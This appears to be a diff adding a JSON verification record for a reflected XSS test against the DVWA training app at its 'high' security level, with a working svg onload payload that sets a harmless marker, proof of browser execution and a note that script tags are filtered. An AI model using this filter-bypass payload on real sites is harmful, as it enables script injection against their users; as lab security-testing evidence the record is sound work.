@@ -1,0 +1,66 @@
+{
+  "run_id": "wp4-20261019-xss003-high",
+  "sample_id": "XSS-003",
+  "path_id": "vulnerabilities/xss_r/index.php:name",
+  "condition_key": "env=dvwa-wsl-01|role=admin|security=high|object=none|state=initialized",
+  "observations": {
+    "endpoint": "/vulnerabilities/xss_r/index.php",
+    "parameter": "name (GET)",
+    "security_level": "high",
+    "identity": {
+      "logged_in": true
+    },
+    "normal_control": {
+      "status": 200,
+      "control_reflected": true
+    },
+    "test": {
+      "status": 200,
+      "payload": "<svg onload=\"window.__wp4xss='WP4XSS003';document.title='WP4XSS003'\">",
+      "payload_reflected_verbatim": true,
+      "response_bytes": 4837
+    },
+    "filter_control": {
+      "input": "<script>alert(1)</script>",
+      "raw_script_tag_present": false,
+      "script_keyword_present": false
+    },
+    "browser_execution": {
+      "executed": true,
+      "marker_in_raw_html": true,
+      "page_errors": [],
+      "screenshot": "verification/evidence/wp4-20261019-xss003-high/browser.png"
+    }
+  },
+  "success_criteria": [
+    "The page returns an authenticated response and reflects the control text.",
+    "The payload reaches the final HTML position without an applicable output filter.",
+    "Headless Chrome sets the JS marker in the page context, proving execution, not just reflection."
+  ],
+  "limitations": [
+    "Only the high xss_r path is covered in one desktop Chrome version.",
+    "The marker is harmless and creates no network request."
+  ],
+  "artifacts": [
+    {
+      "path": "verification/evidence/wp4-20261019-xss003-high/browser.json",
+      "sha256": "43b78baccf8028ecb1713669ca701c221086ab88e23be34112ed78ae566fe6d2",
+      "description": "headless browser evidence: browser.json"
+    },
+    {
+      "path": "verification/evidence/wp4-20261019-xss003-high/browser.png",
+      "sha256": "c8ebfdb62bc5316fd4a8f9a177f98f9847202aeaba285c10ec2527f34bcfe14b",
+      "description": "headless browser evidence: browser.png"
+    },
+    {
+      "path": "verification/evidence/wp4-20261019-xss003-high/request.redacted.json",
+      "sha256": "e02cf8b35392f70d0b72d6d975c1db35bea918e63df256da343b9049d3514c87",
+      "description": "request.redacted.json"
+    },
+    {
+      "path": "verification/evidence/wp4-20261019-xss003-high/response.redacted.txt",
+      "sha256": "0352911c43da5fdd0b902bdb586e213e87f41c037c2623c36fb4ed12f41487cd",
+      "description": "response.redacted.txt"
+    }
+  ]
+}
